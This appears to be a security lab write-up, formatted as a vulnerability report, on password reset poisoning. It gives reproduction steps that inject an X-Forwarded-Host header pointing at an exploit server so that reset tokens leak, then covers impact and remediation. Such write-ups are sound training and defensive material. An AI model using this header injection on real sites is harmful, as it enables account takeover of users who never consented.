# Vulnerability Report — Password Reset Poisoning via Middleware

## 1. Vulnerability Overview
- **Name:** Password Reset Poisoning via Middleware
- **Severity:** High
- **Location:** /forgot-password
- **Tool Used:** Burp Suite + Exploit Server

## 2. Description
The application uses the X-Forwarded-Host header to
build the password reset link sent to the user's email.
An attacker can manipulate this header to point to
their own server. When the victim clicks the reset link,
the token is sent to the attacker's server instead,
allowing full account takeover.

## 3. Steps to Reproduce
1. Go to forgot password page and enter carlos
2. Intercept the request in Burp Suite
3. Add header: X-Forwarded-Host: exploit-server.net
4. Forward the request
5. Check exploit server access log for the token
6. Use token on the original lab server URL
7. Reset carlos password and login

## 4. Evidence
 <img width="1917" height="971" alt="Screenshot 2026-07-03 190325" src="https://github.com/user-attachments/assets/051c9aaf-0ee8-48ce-8e39-27b040ab7518" />
<img width="1917" height="741" alt="Screenshot 2026-07-03 190654" src="https://github.com/user-attachments/assets/b28037bb-da06-4800-8692-929d2b2b2838" />
<img width="1917" height="1017" alt="Screenshot 2026-07-03 192035" src="https://github.com/user-attachments/assets/c792b488-062d-4067-8efa-cce99413892f" />
 ## 5. Impact
Attacker can steal password reset tokens and take
over any account without access to victim's email.

## 6. Remediation
- Never use client-supplied headers to build URLs
- Use the server's configured domain only
- Whitelist allowed Host header values
- Validate and ignore X-Forwarded-Host in reset flows
